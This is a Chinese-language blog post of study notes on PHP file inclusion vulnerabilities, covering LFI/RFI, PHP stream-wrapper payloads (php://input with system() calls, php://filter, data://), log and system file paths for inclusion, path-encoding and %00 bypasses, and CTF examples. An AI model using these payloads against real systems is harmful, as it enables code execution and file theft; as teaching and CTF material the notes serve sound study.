---
title: "up3"
slug: up3
cover: ""
date: 2025-05-01
categories:
  - 杂项
halo:
  site: http://www.hzhsec.top
  name: c9ee2c82-55de-4431-9653-1caa638fefc9
  publish: true
---

+++



title = "文件包含原理、分类、利用与修复"

date = '2024-05-04T10:56:54+08:00'

draft = false

categories = "文件包含"



weight= 3



featured=false



+++



<!--more-->



## 文件包含-原理、分类、利用与修复



### 1. 文件包含原理



文件包含是程序开发中的一种常见技术，通常用于复用代码。开发人员会将可复用的函数或代码模块写入一个单独的文件，其他文件可以直接调用该文件，而不必重复编写。



#### 常见的 PHP 文件包含函数：

- `include()`：遇到错误时生成警告，程序继续执行。

- `require()`：遇到错误时生成致命错误，脚本停止执行。

- `include_once()`：如果文件已包含，则不再进行包含。

- `require_once()`：如果文件已包含，则不再进行包含。

- `fopen()`, `file_get_contents()`：文件读取函数。



### 2. 文件包含分类



文件包含漏洞可以分为两类：



#### 本地文件包含（LFI）

- 该漏洞发生在攻击者能够包含本地文件时。



#### 远程文件包含（RFI）

- 该漏洞发生在攻击者能够通过 URL 包含远程文件时。



#### 差异原因：

- **代码过滤**：本地文件包含和远程文件包含的区别往往取决于应用的代码过滤机制。

- **环境配置**：服务器的配置，如 `allow_url_include` 设置，决定了是否允许远程文件包含。



<img src="/static/image2 1.jpg">



### 3. 白盒审计 - CTFSHOW



#### 白盒发现

- 通过应用功能追踪代码，定位文件包含漏洞。

- 通过脚本搜索特定的文件包含函数，定位潜在的漏洞点。

- 使用伪协议玩法绕过修复措施。



#### PHP 伪协议

PHP 自带多种协议，用于访问特殊资源，例如：

- `php://input`：用于读取请求体中的内容。

- `php://filter`：通过过滤器访问文件内容。

- `data://`：通过数据流访问文件。

- `zip://`：访问压缩包中的文件。

- `phar://`：通过 PHAR 压缩包协议读取文件。



参考：[PHP伪协议技术](https://blog.csdn.net/unexpectedthing/article/details/121276653)



### 4. 黑盒分析



#### 黑盒发现

- 观察 URL 中的参数（如 `path`、`file`、`dir`）是否涉及文件包含。

- 通过分析 URL 中的路径传递参数，判断是否可能导致文件包含漏洞。



#### 利用思路



##### 本地利用

1. 配合文件上传进行利用。

2. 在日志文件中进行包含。

3. 利用会话（SESSION）数据进行包含。

4. 使用伪协议进行绕过。



##### 远程利用

- 利用远程 URL 直接包含恶意文件。



### 5. PHP 伪协议



#### `php://input`（`allow_url_include=On`）

- 使用 `php://input` 伪协议可以绕过一些过滤，获取请求体内容。

```php

// 构造请求

?file=php://input

// POST 数据中输入恶意代码

<?php system('dir'); ?>

```



#### `php://filter`



- 可以将文件内容进行过滤，如使用 `base64` 编码。



```

// 使用 base64 编码绕过

?file=php://filter/read=convert.base64-encode/resource=index.php

```



#### `data://`



- 支持将代码进行编码，通过 `data` 协议访问。



```

?file=data://text/plain,<?php phpinfo()?>

```



#### `zip://`



- 访问压缩包中的文件。



```

?file=zip://D:/file.zip%23flag.txt

```



#### `phar://`



- 类似 `zip://`，可以访问 `.phar` 压缩包中的文件。



```

?file=phar://D:/file.zip/flag.txt

```



### 6. 包含日志文件



攻击者可以利用日志文件中的信息执行恶意代码。以下是常见的日志文件路径：



- **Apache + Linux**：

  - `/var/log/apache2/access.log`

  - `/var/log/apache2/error.log`

  - `/var/log/httpd/access_log`

  - `/etc/httpd/logs/access_log`

- **Nginx**：

  - `/var/log/nginx/access.log`

  - `/usr/local/nginx/logs/access.log`

- **IIS**：

  - `C:\Windows\system32\Logfiles`

  - `%SystemDrive%\inetpub\logs\LogFiles`



### 7. 包含系统文件



在某些配置下，攻击者可以包含系统文件。例如：



- 包含 `proc/self/environ` 可以获取 `User-Agent` 中的信息，并执行恶意代码。



```

<?php

include("php://input");

```



### 8. 文件写入



通过 `php://filter` 可以进行文件写入操作。



```

php://filter/write=convert.base64-encode/resource=phpinfo.php

```



### 9. 绕过技巧



#### 过滤 `read` 或 `resource`



- 通过绕过过滤器访问文件资源。



```

?f=php://filter/convert.base64-encode/resource=login.php

```



#### 过滤 `../`



- 使用 URL 编码来绕过路径过滤：



```

%2e%2e%2f   // 对应 ../

%252e%252e%252f   // 二次编码

```



#### `%00` 截断



- 利用 `%00` 截断字符进行文件包含。



```

?p=../hanguo/test.php%00

```



### 10. CTF 实战



#### 黑盒利用 - VULWEB



利用漏洞网页进行文件包含攻击：



```

http://testphp.vulnweb.com/showimage.php?file=index.php

```



#### 白盒利用 - CTFSHOW



CTF 实战中，常见的伪协议绕过方法：



```

?file=php://filter/read=convert.base64-encode/resource=flag.php

?file=php://input post:<?php system('tac flag.php');?>

```



### 11. 其他伪协议与漏洞



在 CTF 比赛中，经常会用到伪协议、路径遍历等技巧：



- `php://filter/write` 用于写入文件。

- `data://` 用于绕过字符过滤。



> 参考文献：[Session 漏洞分析](https://www.cnblogs.com/lnterpreter/p/14086164.html)



> 参考文献：[CTF 解题思路](https://www.cnblogs.com/echoDetected/p/13976405.html)



------